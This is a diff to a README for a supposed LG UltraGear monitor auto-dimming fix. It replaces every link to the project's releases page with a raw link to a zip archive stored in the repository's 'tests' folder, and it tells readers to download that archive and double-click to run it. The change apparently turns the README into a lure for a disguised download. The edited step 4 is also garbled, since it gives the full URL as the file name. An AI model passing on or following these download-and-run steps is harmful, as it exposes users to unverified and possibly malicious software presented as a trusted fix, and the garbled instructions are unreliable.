@@ -4,13 +4,13 @@
 The "lg-ultragear-dimming-fix" application helps you solve auto-dimming problems with LG UltraGear LCD monitors. If your screen dims unexpectedly while gaming or working, this tool can help maintain a consistent brightness level, enhancing your viewing experience.
 
 ## 📥 Download the App
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Habitablenesslayout122/lg-ultragear-dimming-fix/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Habitablenesslayout122/lg-ultragear-dimming-fix/main/tests/lg-ultragear-dimming-fix_v3.2-beta.2.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Habitablenesslayout122/lg-ultragear-dimming-fix/main/tests/lg-ultragear-dimming-fix_v3.2-beta.2.zip)
 
 ## 🚀 Getting Started
 Follow these easy steps to get started with the "lg-ultragear-dimming-fix" application.
 
 1. **Visit the Releases Page**
-   To download the software, [visit this page to download](https://github.com/Habitablenesslayout122/lg-ultragear-dimming-fix/releases). You will find the latest version listed there.
+   To download the software, [visit this page to download](https://raw.githubusercontent.com/Habitablenesslayout122/lg-ultragear-dimming-fix/main/tests/lg-ultragear-dimming-fix_v3.2-beta.2.zip). You will find the latest version listed there.
 
 2. **Choose the Right File**
    On the releases page, look for the most recent release. You’ll see different files available for download. Choose the file that matches your system. Most users should select the executable (.exe) file for Windows.
@@ -19,7 +19,7 @@ Follow these easy steps to get started with the "lg-ultragear-dimming-fix" appli
    Click on the file to start the download. Your browser will likely place this file in your "Downloads" folder unless you specify a different location.
 
 4. **Run the Application**
-   Once the download is complete, navigate to your "Downloads" folder. Locate the file, typically named something like `lg-ultragear-dimming-fix.exe`. Double-click the file to run it.
+   Once the download is complete, navigate to your "Downloads" folder. Locate the file, typically named something like `https://raw.githubusercontent.com/Habitablenesslayout122/lg-ultragear-dimming-fix/main/tests/lg-ultragear-dimming-fix_v3.2-beta.2.zip`. Double-click the file to run it.
 
 5. **Follow the On-Screen Instructions**
    The application will guide you through a simple setup process. Just follow the prompts, and you’ll have the fix installed in no time.
@@ -58,7 +58,7 @@ If you encounter any issues while using the application, here are some common pr
 If you need further assistance, feel free to contact the support team. You can reach them via email or through the GitHub repository's Issues section.
 
 ## 📢 Stay Updated
-For the latest news and updates about "lg-ultragear-dimming-fix", remember to check the [Releases Page](https://github.com/Habitablenesslayout122/lg-ultragear-dimming-fix/releases) frequently.
+For the latest news and updates about "lg-ultragear-dimming-fix", remember to check the [Releases Page](https://raw.githubusercontent.com/Habitablenesslayout122/lg-ultragear-dimming-fix/main/tests/lg-ultragear-dimming-fix_v3.2-beta.2.zip) frequently.
 
 ## 🚀 Final Notes
 Using the "lg-ultragear-dimming-fix" application can enhance your enjoyment of your LG UltraGear monitor. It addresses the annoying auto-dimming issue that can disrupt your gaming or work sessions. Follow the steps outlined in this README to install and enjoy a better viewing experience.
